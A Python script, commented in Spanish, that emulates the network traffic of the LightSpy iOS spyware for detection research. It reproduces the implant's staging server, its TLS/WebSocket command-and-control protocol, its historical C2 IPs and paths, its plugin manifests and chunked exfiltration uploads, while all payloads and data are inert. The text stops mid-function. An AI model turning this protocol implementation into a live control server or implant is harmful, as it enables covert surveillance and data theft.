#!/usr/bin/env python3
"""Emulación segura de la firma de red de LightSpy para iOS.

El modo ``serve`` inicia el staging HTTP y un único extremo TLS que atiende
HTTPS y WSS en TCP/50000. El modo ``client`` reproduce el flujo seleccionado
sin ejecutar ninguno de los Mach-O analizados.
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import contextlib
import hashlib
import json
import os
import secrets
import shutil
import signal
import socket
import ssl
import struct
import subprocess
import sys
import time
from dataclasses import dataclass, field
from email.parser import BytesParser
from email.policy import default as email_policy
from pathlib import Path
from typing import Any, Iterable
from urllib.parse import urlsplit


ROOT = Path(__file__).resolve().parent
CERT_DIR = ROOT / "certs"
PAYLOAD_DIR = ROOT / "payloads"
LOG_DIR = ROOT / "logs"
CAPTURE_DIR = ROOT / "captures"

STAGE_IP = "45.83.237.13"
STAGE_PORT = 8088
STAGE_PREFIX = "/963852741/hh1212/"
C2_IP = "45.134.1.180"
C2_PORT = 50000
DNS_IP = "8.8.8.8"
DNS_PORT = 53
BAIDU_NAME = "www.baidu.com"

DEVICE_ID = "6f83d58e9c4a42b58a6161efc0b50f74"
CONSOLE_PARAM = "s4|12|1"
MODE = "brower"
APK_VERSION = "6.0.0"
INITIAL_PLUGIN_VERSION = "1"
REMOTE_PLUGIN_VERSION = "2"
INITIAL_CONTROL_VERSION = "1"
REMOTE_CONTROL_VERSION = "2"
INITIAL_PLAN_VERSION = "1"
REMOTE_PLAN_VERSION = "2"

STAGE_NAMES = (
    "browser",
    "EnvironmentalRecording",
    "FileManage",
    "ios_qq",
    "ios_telegram",
    "ios_wechat",
    "KeyChain",
    "light",
    "Screenaaa",
    "ShellCommandaaa",
    "SoftInfoaaa",
    "WifiList",
    "locationaaa.dylib",
    "baseinfoaaa.dylib",
    "irc_loader",
    "launchctl",
    "ircbin.plist",
)

WECHAT_MD5 = "66d2379318ce8f74cfbd0fb26afc2084"
VIRTUAL_WECHAT_PATH = (
    "/var/mobile/Containers/Data/Application/"
    "9F2A7B41-6D30-4B82-9D67-9E4A912A603C/Documents/MM.sqlite"
)
CHUNK_SIZE = 0x64000
RESPONSE_PREFIX = b"\x00\x00\x00\x00"
MAX_HTTP_IN_FLIGHT = 5

PERMISSION_FRAME = {
    "cmd": 10018,
    "status": 0,
    "data": {
        "ReadPhoneState": 1,
        "ReadContacts": 1,
        "ReadExternalStorage": 1,
        "WriteExternalStorage": 1,
        "ReadSms": 1,
        "Location": 1,
        "Camera": 1,
        "ReadCallLog": 1,
        "RecordAudio": 1,
        "ModifyAudioSettings": 1,
        "ProcessOutgoingCalls": 0,
        "AccessWifiState": 1,
        "WakeLock": 1,
        "GetTasks": 1,
        "CanDrawOverlays": 1,
    },
}


def compact_json(value: Any) -> str:
    return json.dumps(value, ensure_ascii=False, separators=(",", ":"))


def timestamp() -> str:
    return time.strftime("%Y%m%d-%H%M%S")


class EventLog:
    def __init__(self, role: str) -> None:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        self.path = LOG_DIR / f"{role}-{timestamp()}-{os.getpid()}.jsonl"
        self.role = role

    def emit(self, event: str, **details: Any) -> None:
        record = {
            "time": time.time(),
            "role": self.role,
            "event": event,
            **details,
        }
        with self.path.open("a", encoding="utf-8", newline="\n") as stream:
            stream.write(compact_json(record) + "\n")


def deterministic_bytes(label: str, size: int) -> bytes:
    output = bytearray()
    counter = 0
    seed = label.encode("utf-8")
    while len(output) < size:
        output.extend(hashlib.sha256(seed + struct.pack(">I", counter)).digest())
        counter += 1
    return bytes(output[:size])


def inert_macho(name: str) -> bytes:
    # mach_header_64 ARM64 con cero comandos de carga, seguido de datos inertes.
    header = struct.pack(
        "<IiiIIIII",
        0xFEEDFACF,
        0x0100000C,
        0,
        6,
        0,
        0,
        0,
        0,
    )
    return header + deterministic_bytes(name, 8192 - len(header))


def ensure_payloads() -> None:
    PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
    for name in STAGE_NAMES[:-1]:
        path = PAYLOAD_DIR / name
        if not path.exists():
            path.write_bytes(inert_macho(name))

    plist = PAYLOAD_DIR / "ircbin.plist"
    if not plist.exists():
        plist.write_bytes(
            b'<?xml version="1.0" encoding="UTF-8"?>\n'
            b'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
            b'"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
            b'<plist version="1.0"><dict/></plist>\n'
        )

    wechat_result = PAYLOAD_DIR / "wechat-result.bin"
    if not wechat_result.exists():
        wechat_result.write_bytes(deterministic_bytes("wechat-result", 600_000))


def certificate_is_current(certificate: Path, private_key: Path) -> bool:
    if not certificate.is_file() or not private_key.is_file():
        return False
    try:
        probe = subprocess.run(
            ["openssl", "x509", "-in", str(certificate), "-noout", "-ext", "subjectAltName"],
            check=True,
            capture_output=True,
            text=True,
        )
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certificate, private_key)
    except (FileNotFoundError, OSError, ssl.SSLError, subprocess.CalledProcessError):
        return False
    identities = [line.strip() for line in probe.stdout.splitlines() if "IP Address:" in line or "DNS:" in line]
    return identities == [f"IP Address:{C2_IP}"]


def ensure_certificate() -> tuple[Path, Path]:
    CERT_DIR.mkdir(parents=True, exist_ok=True)
    certificate = CERT_DIR / "server.crt"
    private_key = CERT_DIR / "server.key"
    if certificate_is_current(certificate, private_key):
        return certificate, private_key

    command = [
        "openssl",
        "req",
        "-x509",
        "-newkey",
        "rsa:2048",
        "-sha256",
        "-nodes",
        "-days",
        "3650",
        "-keyout",
        str(private_key),
        "-out",
        str(certificate),
        "-subj",
        f"/CN={C2_IP}",
        "-addext",
        f"subjectAltName=IP:{C2_IP}",
    ]
    try:
        subprocess.run(
            command,
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except (FileNotFoundError, subprocess.CalledProcessError) as exc:
        raise RuntimeError(
            "No se pudo generar el certificado. Instala openssl dentro de WSL."
        ) from exc
    private_key.chmod(0o600)
    if not certificate_is_current(certificate, private_key):
        raise RuntimeError("El certificado LightSpy generado no coincide con la identidad C2")
    return certificate, private_key


def server_tls_context() -> ssl.SSLContext:
    certificate, private_key = ensure_certificate()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.options |= ssl.OP_NO_COMPRESSION
    context.set_ciphers(
        "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256"
    )
    context.load_cert_chain(certificate, private_key)
    return context


def client_tls_context(keylog: Path) -> ssl.SSLContext:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.options |= ssl.OP_NO_COMPRESSION
    context.set_ciphers(
        "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256"
    )
    context.keylog_filename = str(keylog)
    return context


async def close_writer(writer: asyncio.StreamWriter) -> None:
    writer.close()
    with contextlib.suppress(Exception):
        await writer.wait_closed()


async def read_http_request(
    reader: asyncio.StreamReader,
) -> tuple[str, str, str, dict[str, str], bytes]:
    raw_head = await reader.readuntil(b"\r\n\r\n")
    if len(raw_head) > 64 * 1024:
        raise ValueError("Cabecera HTTP excesiva")
    lines = raw_head[:-4].split(b"\r\n")
    method, path, version = lines[0].decode("ascii").split(" ", 2)
    headers: dict[str, str] = {}
    for line in lines[1:]:
        name, value = line.split(b":", 1)
        headers[name.decode("ascii").lower()] = value.decode("latin-1").strip()
    length = int(headers.get("content-length", "0"))
    body = await reader.readexactly(length) if length else b""
    return method, path, version, headers, body


async def send_http_response(
    writer: asyncio.StreamWriter,
    status: int,
    body: bytes,
    content_type: str,
) -> None:
    reasons = {200: "OK", 400: "Bad Request", 404: "Not Found"}
    head = (
        f"HTTP/1.1 {status} {reasons[status]}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Content-Type: {content_type}\r\n"
        "\r\n"
    ).encode("ascii")
    writer.write(head + body)
    await writer.drain()


async def read_http_response(
    reader: asyncio.StreamReader,
) -> tuple[int, dict[str, str], bytes]:
    raw_head = await reader.readuntil(b"\r\n\r\n")
    lines = raw_head[:-4].split(b"\r\n")
    status = int(lines[0].split(b" ", 2)[1])
    headers: dict[str, str] = {}
    for line in lines[1:]:
        name, value = line.split(b":", 1)
        headers[name.decode("ascii").lower()] = value.decode("latin-1").strip()
    length = int(headers.get("content-length", "0"))
    body = await reader.readexactly(length) if length else b""
    return status, headers, body


def parse_multipart(
    content_type: str, body: bytes
) -> tuple[dict[str, str], dict[str, tuple[str, bytes]]]:
    envelope = (
        f"Content-Type: {content_type}\r\nMIME-Version: 1.0\r\n\r\n".encode(
            "latin-1"
        )
        + body
    )
    message = BytesParser(policy=email_policy).parsebytes(envelope)
    fields: dict[str, str] = {}
    files: dict[str, tuple[str, bytes]] = {}
    if not message.is_multipart():
        raise ValueError("El cuerpo no es multipart")
    for part in message.iter_parts():
        name = part.get_param("name", header="content-disposition")
        if not name:
            continue
        payload = part.get_payload(decode=True) or b""
        filename = part.get_filename()
        if filename is None:
            fields[name] = payload.decode("utf-8")
        else:
            files[name] = (filename, payload)
    return fields, files


async def handle_stage(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
    log: EventLog,
) -> None:
    try:
        method, path, version, headers, _ = await read_http_request(reader)
        name = path.removeprefix(STAGE_PREFIX)
        target = PAYLOAD_DIR / name
        if (
            method != "GET"
            or not path.startswith(STAGE_PREFIX)
            or name not in STAGE_NAMES
            or not target.is_file()
        ):
            await send_http_response(writer, 404, b"", "application/octet-stream")
            return
        body = target.read_bytes()
        log.emit(
            "stage_get",
            method=method,
            path=path,
            version=version,
            host=headers.get("host"),
            size=len(body),
            sha256=hashlib.sha256(body).hexdigest(),
        )
        await send_http_response(writer, 200, body, "application/octet-stream")
    except (asyncio.IncompleteReadError, ConnectionError, ValueError) as exc:
        log.emit("stage_error", error=type(exc).__name__)
    finally:
        await close_writer(writer)


async def ws_read_frame(
    reader: asyncio.StreamReader,
) -> tuple[bool, int, bool, bytes]:
    first, second = await reader.readexactly(2)
    fin = bool(first & 0x80)
    opcode = first & 0x0F
    masked = bool(second & 0x80)
    length = second & 0x7F
    if length == 126:
        length = struct.unpack(">H", await reader.readexactly(2))[0]
    elif length == 127:
        length = struct.unpack(">Q", await reader.readexactly(8))[0]
    mask = await reader.readexactly(4) if masked else b""
    payload = await reader.readexactly(length)
    if masked:
        payload = bytes(byte ^ mask[index % 4] for index, byte in enumerate(payload))
    return fin, opcode, masked, payload


def ws_frame(payload: bytes, opcode: int, masked: bool) -> bytes:
    first = 0x80 | opcode
    length = len(payload)
    flag = 0x80 if masked else 0
    if length < 126:
        header = bytes((first, flag | length))
    elif length <= 0xFFFF:
        header = bytes((first, flag | 126)) + struct.pack(">H", length)
    else:
        header = bytes((first, flag | 127)) + struct.pack(">Q", length)
    if not masked:
        return header + payload
    mask = secrets.token_bytes(4)
    encoded = bytes(byte ^ mask[index % 4] for index, byte in enumerate(payload))
    return header + mask + encoded


@dataclass
class ServerState:
    log: EventLog
    sync_seen: set[int] = field(default_factory=set)
    sync_sent: bool = False
    manifest_sent: bool = False
    inventory_count: int = 0
    aggregate_count: int = 0
    order_sent: bool = False
    uploads: dict[str, bytearray] = field(default_factory=dict)
    ws_write_lock: asyncio.Lock = field(default_factory=asyncio.Lock)

    async def send_ws(
        self, writer: asyncio.StreamWriter, message: dict[str, Any]
    ) -> None:
        serialized = compact_json(message).encode("utf-8")
        async with self.ws_write_lock:
            writer.write(ws_frame(serialized, opcode=1, masked=False))
            await writer.drain()
        self.log.emit("wss_send", cmd=message.get("cmd"), json=serialized.decode())

    async def maybe_send_sync(self, writer: asyncio.StreamWriter) -> None:
        required = {10002, 10003, 10004, 10005, 10013}
        if self.sync_sent or not required.issubset(self.sync_seen):
            return
        self.sync_sent = True
        await self.send_ws(
            writer,
            {"cmd": 10002, "data": {"heartinterval": 10, "reconnect": 10}},
        )
        await self.send_ws(writer, {"cmd": 10013, "data": []})
        manifest = {
            "cmd": 10005,
            "version": REMOTE_PLUGIN_VERSION,
            "data": [
                {
                    "name": "ios_wechat",
                    "md5": WECHAT_MD5,
                    "ver": "1.0.0",
                    "url": (
                        f"http://{STAGE_IP}:{STAGE_PORT}"
                        f"{STAGE_PREFIX}ios_wechat"
                    ),
                    "classpath": "PluginWeChat",
                    "initparam": "",
                }
            ],
        }
        await self.send_ws(writer, manifest)
        self.manifest_sent = True

    async def handle_ws_message(
        self, writer: asyncio.StreamWriter, message: dict[str, Any]
    ) -> bool:
        command = int(message.get("cmd", -1))
        self.log.emit("wss_receive", cmd=command, json=compact_json(message))

        if command == 10001:
            await self.send_ws(
                writer,
                {
                    "cmd": 10001,
                    "data": {
                        "controlver": REMOTE_CONTROL_VERSION,
                        "planver": REMOTE_PLAN_VERSION,
                    },
                },
            )
        elif command in {10002, 10005, 10013}:
            self.sync_seen.add(command)
        elif command == 10018:
            pass
        elif command == 10003:
            self.sync_seen.add(command)
            await self.send_ws(
                writer,
                {
                    "cmd": 10003,
                    "version": REMOTE_CONTROL_VERSION,
                    "data": [{"cmd": 12005, "wifi": 1, "mobile": 1}],
                },
            )
        elif command == 10004:
            self.sync_seen.add(command)
            await self.send_ws(
                writer,
                {
                    "cmd": 10004,
                    "version": REMOTE_PLAN_VERSION,
                    "data": [
                        {
                            "type": 0,
                            "start": 0,
                            "stop": 0,
                            "interval": 1,
                            "cmdlist": [{"cmd": 12005}],
                        }
                    ],
                },
            )
        elif command == 10007:
            self.inventory_count += 1
        elif command == 10017:
            entries = message.get("data") or []
            if any(entry.get("status") == 4 for entry in entries):
                self.aggregate_count += 1
                if (
                    self.manifest_sent
                    and self.inventory_count >= 2
                    and not self.order_sent
                ):
                    self.order_sent = True
                    await self.send_ws(
                        writer,
                        {"cmd": 10008, "data": [{"cmd": 12005}]},
                    )
        elif command == 12005:
            self.log.emit("command_complete", cmd=12005)
            writer.write(ws_frame(struct.pack(">H", 1000), opcode=8, masked=False))
            await writer.drain()
            return False

        await self.maybe_send_sync(writer)
        return True


async def handle_websocket(
    path: str,
    headers: dict[str, str],
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
    state: ServerState,
) -> None:
    key = headers.get("sec-websocket-key")
    protocol = headers.get("sec-websocket-protocol")
    if not key or protocol != "irc-test-proto":
        await send_http_response(writer, 400, b"", "application/octet-stream")
        return
    accept = base64.b64encode(
        hashlib.sha1(
            key.encode("ascii") + b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
        ).digest()
    ).decode("ascii")
    response = (
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Accept: {accept}\r\n"
        "Sec-WebSocket-Protocol: irc-test-proto\r\n"
        "\r\n"
    ).encode("ascii")
    writer.write(response)
    await writer.drain()
    ssl_object = writer.get_extra_info("ssl_object")
    state.log.emit(
        "wss_upgrade",
        path=path,
        protocol=protocol,
        tls=ssl_object.version() if ssl_object else None,
        cipher=ssl_object.cipher()[0] if ssl_object else None,
    )

    while True:
        fin, opcode, masked, payload = await ws_read_frame(reader)
        if opcode == 8:
            writer.write(ws_frame(payload, opcode=8, masked=False))
            await writer.drain()
            break
        if opcode == 9:
            writer.write(ws_frame(payload, opcode=10, masked=False))
            await writer.drain()
            continue
        if opcode != 1 or not fin or not masked:
            raise ValueError("Trama WebSocket del cliente incompatible")
        message = json.loads(payload.decode("utf-8"))
        if not await state.handle_ws_message(writer, message):
            break


async def handle_c2_http(
    path: str,
    version: str,
    headers: dict[str, str],
    body: bytes,
    writer: asyncio.StreamWriter,
    state: ServerState,
) -> None:
    content_type = headers.get("content-type", "")
    fields, files = parse_multipart(content_type, body)
    state.log.emit(
        "https_post",
        path=path,
        version=version,
        fields=fields,
        files={key: {"filename": value[0], "size": len(value[1])} for key, value in files.items()},
    )

    if path in {"/api/log/", "/api/phone/"}:
        response = RESPONSE_PREFIX + compact_json({"code": 0}).encode("utf-8")
    elif path == "/api/phone_shard_file":
        try:
            offset = int(fields["offset"])
            total_size = int(fields["size"])
            expected_hash = fields["hash"]
            _, chunk = files["file"]
        except (KeyError, ValueError) as exc:
            raise ValueError("Fragmento multipart incompleto") from exc
        upload = state.uploads.setdefault(expected_hash, bytearray())
        if offset == 0:
            upload.clear()
        if len(upload) < offset:
            upload.extend(b"\x00" * (offset - len(upload)))
        upload[offset : offset + len(chunk)] = chunk
        next_offset = offset + len(chunk)
        if next_offset >= total_size:
            next_offset = 0
            state.log.emit(
                "upload_complete",
                size=len(upload),
                md5=hashlib.md5(upload).hexdigest(),
                expected_md5=expected_hash,
            )
        response = RESPONSE_PREFIX + compact_json({"offset": next_offset}).encode(
            "utf-8"
        )
    else:
        await send_http_response(writer, 404, b"", "application/octet-stream")
        return
    await send_http_response(writer, 200, response, "application/octet-stream")


async def handle_c2(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
    state: ServerState,
) -> None:
    try:
        method, path, version, headers, body = await read_http_request(reader)
        if method == "GET" and headers.get("upgrade", "").lower() == "websocket":
            await handle_websocket(path, headers, reader, writer, state)
        elif method == "POST":
            await handle_c2_http(path, version, headers, body, writer, state)
        else:
            await send_http_response(writer, 404, b"", "application/octet-stream")
    except (asyncio.IncompleteReadError, ConnectionError, ValueError, json.JSONDecodeError) as exc:
        state.log.emit("c2_error", error=type(exc).__name__, detail=str(exc))
    finally:
        await close_writer(writer)


async def start_servers(
) -> tuple[asyncio.AbstractServer, asyncio.AbstractServer, ServerState, EventLog]:
    ensure_payloads()
    log = EventLog("server")
    state = ServerState(log=log)
    tls_context = server_tls_context()
    stage: asyncio.AbstractServer | None = None
    try:
        stage = await asyncio.start_server(
            lambda r, w: handle_stage(r, w, log), STAGE_IP, STAGE_PORT
        )
        c2 = await asyncio.start_server(
            lambda r, w: handle_c2(r, w, state),
            C2_IP,
            C2_PORT,
            ssl=tls_context,
        )
    except OSError as exc:
        if stage is not None:
            stage.close()
            await stage.wait_closed()
        raise RuntimeError(
            "No se pudieron enlazar las IP históricas. Asígnalas primero a lo."
        ) from exc
    return stage, c2, state, log


async def run_servers() -> None:
    stage, c2, _, log = await start_servers()

    print(f"Staging HTTP: {STAGE_IP}:{STAGE_PORT}")
    print(f"C2 HTTPS/WSS: {C2_IP}:{C2_PORT}")
    print(f"Registro local: {log.path}")
    print("Servicios listos. Detén el proceso con Ctrl+C.")
    async with stage, c2:
        await asyncio.gather(stage.serve_forever(), c2.serve_forever())


async def plain_http_get(path: str, log: EventLog) -> bytes:
    reader, writer = await asyncio.open_connection(STAGE_IP, STAGE_PORT)
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {STAGE_IP}:{STAGE_PORT}\r\n"
        "Accept: */*\r\n"
        "\r\n"
    ).encode("ascii")
    writer.write(request)
    await writer.drain()
    status, _, body = await read_http_response(reader)
    await close_writer(writer)
    if status != 200:
        raise RuntimeError(f"El staging devolvió HTTP {status} para {path}")
    log.emit(
        "stage_response",
        path=path,
        size=len(body),
        sha256=hashlib.sha256(body).hexdigest(),
    )
    return body


def multipart_body(
    fields: Iterable[tuple[str, Any]],
    file_part: tuple[str, str, bytes, str] | None = None,
) -> tuple[str, bytes]:
    boundary = "------------------------" + secrets.token_hex(8)
    output = bytearray()
    for name, value in fields:
        output.extend(f"--{boundary}\r\n".encode("ascii"))
        output.extend(
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode(
                "utf-8"
            )
        )
        output.extend(str(value).encode("utf-8"))
        output.extend(b"\r\n")
    if file_part is not None:
        field_name, filename, content, media_type = file_part
        output.extend(f"--{boundary}\r\n".encode("ascii"))
        output.extend(
            (
                f'Content-Disposition: form-data; name="{field_name}"; '
                f'filename="{filename}"\r\n'
                f"Content-Type: {media_type}\r\n\r\n"
            ).encode("utf-8")
        )
        output.extend(content)
        output.extend(b"\r\n")
    output.extend(f"--{boundary}--\r\n".encode("ascii"))
    return f"multipart/form-data; boundary={boundary}", bytes(output)


async def https_post(
    path: str,
    fields: Iterable[tuple[str, Any]],
    tls_context: ssl.SSLContext,
    log: EventLog,
    file_part: tuple[str, str, bytes, str] | None = None,
) -> dict[str, Any]:
    content_type, body = multipart_body(fields, file_part)
    reader, writer = await asyncio.open_connection(
        C2_IP,
        C2_PORT,
        ssl=tls_context,
        server_hostname=None,
    )
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {C2_IP}:{C2_PORT}\r\n"
        "Accept: */*\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Content-Type: {content_type}\r\n"
        "\r\n"
    ).encode("ascii")
    writer.write(request + body)
    await writer.drain()
    status, _, response = await read_http_response(reader)
    ssl_object = writer.get_extra_info("ssl_object")
    await close_writer(writer)
    if status != 200 or len(response) < 4:
        raise RuntimeError(f"Respuesta HTTPS inválida para {path}")
    parsed = json.loads(response[4:].decode("utf-8"))
    log.emit(
        "https_response",
        path=path,
        status=status,
        response=parsed,
        tls=ssl_object.version() if ssl_object else None,
        cipher=ssl_object.cipher()[0] if ssl_object else None,
    )
    return parsed


class MultipartDispatcher:
    def __init__(self, tls_context: ssl.SSLContext, log: EventLog) -> None:
        self.tls_context = tls_context
        self.log = log
        self.semaphore = asyncio.Semaphore(MAX_HTTP_IN_FLIGHT)
        self.tasks: list[asyncio.Task[dict[str, Any]]] = []

    async def submit(self, path: str, fields: list[tuple[str, Any]]) -> None:
        await self.semaphore.acquire()
        task = asyncio.create_task(self._execute(path, fields))
        self.tasks.append(task)

    async def _execute(
        self, path: str, fields: list[tuple[str, Any]]
    ) -> dict[str, Any]:
        try:
            return await https_post(path, fields, self.tls_context, self.log)
        finally:
            self.semaphore.release()

    async def wait(self) -> None:
        if self.tasks:
            await asyncio.gather(*self.tasks)


async def dns_probe(log: EventLog) -> str:
    transaction = secrets.randbits(16)
    labels = BAIDU_NAME.split(".")
    question = b"".join(bytes((len(label),)) + label.encode("ascii") for label in labels)
    question += b"\x00" + struct.pack(">HH", 1, 1)
    query = struct.pack(">HHHHHH", transaction, 0x0100, 1, 0, 0, 0) + question
    loop = asyncio.get_running_loop()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    try:
        await loop.sock_sendto(sock, query, (DNS_IP, DNS_PORT))
        response = await asyncio.wait_for(loop.sock_recv(sock, 4096), timeout=3)
    finally:
        sock.close()
    if len(response) < 12 or struct.unpack(">H", response[:2])[0] != transaction:
        raise RuntimeError("Respuesta DNS inválida")
    answer_count = struct.unpack(">H", response[6:8])[0]
    address = ""
    for index in range(12, len(response) - 3):
        if response[index : index + 4] == b"\x00\x01\x00\x01":
            # Se localiza el último RDATA IPv4 de longitud cuatro.
            for cursor in range(index + 4, len(response) - 5):
                if response[cursor : cursor + 2] == b"\x00\x04":
                    address = socket.inet_ntoa(response[cursor + 2 : cursor + 6])
    log.emit(
        "dns_response", name=BAIDU_NAME, answers=answer_count, address=address
    )
    return address


class WebSocketClient:
    def __init__(
        self,
        tls_context: ssl.SSLContext,
        log: EventLog,
    ) -> None:
        self.tls_context = tls_context
        self.log = log
        self.connected = asyncio.Event()
        self.writer: asyncio.StreamWriter | None = None
        self.outgoing: asyncio.Queue[
            tuple[dict[str, Any], asyncio.Future[None]] | None
        ] = asyncio.Queue()
        self.sender_task: asyncio.Task[None] | None = None
        self.handler: Any = None

    def websocket_path(self) -> str:
        secret = DEVICE_ID + "abcdef!@#$%^123456ABCDEF"
        token = hashlib.md5(secret.encode("utf-8")).hexdigest()
        registration = compact_json(
            {"os": "ios", "app": MODE, "param": CONSOLE_PARAM}
        )
        encoded = registration.encode("utf-8").hex()
        return f"/android_ws/{DEVICE_ID}/{token}/S4|{encoded}"

    async def send_json(self, message: dict[str, Any]) -> None:
        future: asyncio.Future[None] = asyncio.get_running_loop().create_future()
        await self.outgoing.put((message, future))
        await future

    async def sender(self) -> None:
        assert self.writer is not None
        while True:
            item = await self.outgoing.get()
            if item is None:
                return
            message, future = item
            serialized = compact_json(message).encode("utf-8")
            try:
                self.writer.write(ws_frame(serialized, opcode=1, masked=True))
                await self.writer.drain()
                self.log.emit(
                    "wss_send", cmd=message.get("cmd"), json=serialized.decode()
                )
                future.set_result(None)
            except Exception as exc:
                future.set_exception(exc)
                raise

    async def run(self, handler: Any) -> None:
        self.handler = handler
        reader, writer = await asyncio.open_connection(
            C2_IP,
            C2_PORT,
            ssl=self.tls_context,
            server_hostname=None,
        )
        self.writer = writer
        path = self.websocket_path()
        key = base64.b64encode(secrets.token_bytes(16)).decode("ascii")
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {C2_IP}:{C2_PORT}\r\n"
            f"Origin: http://{C2_IP}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "Sec-WebSocket-Protocol: irc-test-proto\r\n"
            "\r\n"
        ).encode("ascii")
        writer.write(request)
        await writer.drain()
        status, headers, _ = await read_http_response(reader)
        if status != 101 or headers.get("sec-websocket-protocol") != "irc-test-proto":
            raise RuntimeError("El servidor rechazó el saludo WebSocket")
        expected = base64.b64encode(
            hashlib.sha1(
                key.encode("ascii") + b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
            ).digest()
        ).decode("ascii")
        if headers.get("sec-websocket-accept") != expected:
            raise RuntimeError("Sec-WebSocket-Accept incorrecto")
        self.connected.set()
        self.log.emit("wss_connected", path=path, protocol="irc-test-proto")
        self.sender_task = asyncio.create_task(self.sender())

        try:
            while True:
                fin, opcode, masked, payload = await ws_read_frame(reader)
                if opcode == 8:
                    writer.write(ws_frame(payload, opcode=8, masked=True))
                    await writer.drain()
                    break
                if opcode == 9:
                    writer.write(ws_frame(payload, opcode=10, masked=True))
                    await writer.drain()
                    continue
                if opcode != 1 or not fin or masked:
                    raise RuntimeError("Trama WebSocket del servidor incompatible")
                message = json.loads(payload.decode("utf-8"))
                self.log.emit(
                    "wss_receive",
                    cmd=message.get("cmd"),
                    json=payload.decode("utf-8"),
                )
                await handler(message)
        finally:
            await self.outgoing.put(None)
            if self.sender_task is not None:
                with contextlib.suppress(asyncio.CancelledError):
                    await self.sender_task
            await close_writer(writer)


class ClientScenario:
    def __init__(self, tls_context: ssl.SSLContext, log: EventLog) -> None:
        self.tls_context = tls_context
        self.log = log
        self.dispatcher = MultipartDispatcher(tls_context, log)
        self.ws = WebSocketClient(tls_context, log)
        self.initial_load_done = asyncio.Event()
        self.plugin_version = INITIAL_PLUGIN_VERSION
        self.control_version = INITIAL_CONTROL_VERSION
        self.plan_version = INITIAL_PLAN_VERSION
        self.downloaded: set[str] = set()

    async def send_log(self, content: str) -> None:
        await self.dispatcher.submit(
            "/api/log/",
            [("uid", DEVICE_ID), ("cmd", 10000), ("content", content)],
        )

    async def plugin_load(self, generation: int) -> None:
        await self.send_log("开始加载插件列表...")
        await self.ws.send_json(
            {
                "cmd": 10007,
                "pluginver": self.plugin_version,
                "data": [
                    {"name": "ios_wechat", "ver": "1.0.0", "status": "0"}
                ],
            }
        )
        present = "ios_wechat" in self.downloaded
        await self.ws.send_json(
            {
                "cmd": 10017,
                "pluginver": self.plugin_version,
                "data": [
                    {
                        "name": "ios_wechat",
                        "ver": "1.0.0",
                        "status": "1" if present else "2",
                    }
                ],
            }
        )
        if not present:
            await self.send_log("ios_wechat file does not exist")
        await self.ws.send_json(
            {
                "cmd": 10017,
                "pluginver": self.plugin_version,
                "data": [
                    {"name": "ios_wechat", "ver": "1.0.0", "status": 4}
                ],
            }
        )
        await self.send_log("加载插件列表完毕...")
        self.log.emit("plugin_load_generated", generation=generation)
        if generation == 1:
            self.initial_load_done.set()

    async def initial_plugin_thread(self) -> None:
        await asyncio.sleep(1)
        await self.plugin_load(1)

    def mobile_information(self) -> str:
        return compact_json(
            {
                "screen": {"metrics": "750x1334", "size": "4.7"},
                "ip": "192.168.1.100",
                "device": "iPhone10,6",
                "system_version": "iOS 12.2",
                "brand": "Apple",
                "is_root": 1,
                "apk_version": APK_VERSION,
                "imsi": "",
                "imei": "",
                "phone_number": "",
                "net_type": "WIFI",
                "working_wifi": "802.11",
                "mac": "02:00:00:00:00:00",
                "provider": "",
                "system": {
                    "memTotal": "3072kB",
                    "memAvailable": "2048kB",
                    "sdTotal": "64GB",
                    "sdAvailable": "48GB",
                    "romTotal": "64GB",
                    "romAvailable": "48GB",
                },
                "cpu": {
                    "cpuName": "ARM64",
                    "cpuArchitecture": "ARM64",
                    "cpuMaxFreq": 2390,
                    "cpuCoresNum": 6,
                    "isCpu64": 1,
                    "cpuUsage": "1.0%",
                },
            }
        )

    async def main_thread(self) -> None:
        while True:
            await asyncio.sleep(3)
            await self.ws.send_json(
                {
                    "cmd": 10001,
                    "data": {
                        "apkver": APK_VERSION,
                        "pluginver": self.plugin_version,
                        "controlver": self.control_version,
                        "planver": self.plan_version,
                        "mode": MODE,
                    },
                }
            )
            if self.ws.connected.is_set():
                await self.initial_load_done.wait()
                await self.dispatcher.submit(
                    "/api/phone/",
                    [
                        ("cmd", 11001),
                        ("uid", DEVICE_ID),
                        ("data", self.mobile_information()),
                    ],
                )
                return

    async def upload_wechat_result(self) -> None:
        source = PAYLOAD_DIR / "wechat-result.bin"
        content = source.read_bytes()
        file_hash = hashlib.md5(content).hexdigest()
        fields = [
            ("cmd", "12005"),
            ("uid", DEVICE_ID),
